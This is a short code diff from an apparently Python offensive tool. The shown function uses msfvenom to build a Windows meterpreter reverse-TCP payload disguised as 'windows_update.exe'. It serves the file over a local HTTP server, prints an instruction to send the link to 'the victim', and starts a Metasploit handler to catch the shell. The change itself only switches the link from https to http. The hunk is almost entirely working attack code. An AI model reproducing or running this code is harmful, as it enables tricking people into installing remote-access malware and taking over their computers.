@@ -135,7 +135,7 @@ def tentar():
                         subprocess.Popen(['python3', '-m', 'http.server', '1234'])
                         os.system(f'msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows -f exe lhost={ip} lport={port} -o windows_update.exe')
                         print(f'{F.LIGHTGREEN_EX}[*] Payload was saved as "windows_update.exe"{F.RESET}')
-                        print(f'{F.LIGHTGREEN_EX}[*] Send link https://{ip}:1234/windows_update.exe to the victim')
+                        print(f'{F.LIGHTGREEN_EX}[*] Send link http://{ip}:1234/windows_update.exe to the victim')
                         os.system(f'msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost {ip}; set lport{port}; exploit;"')
 
             def android_payload():
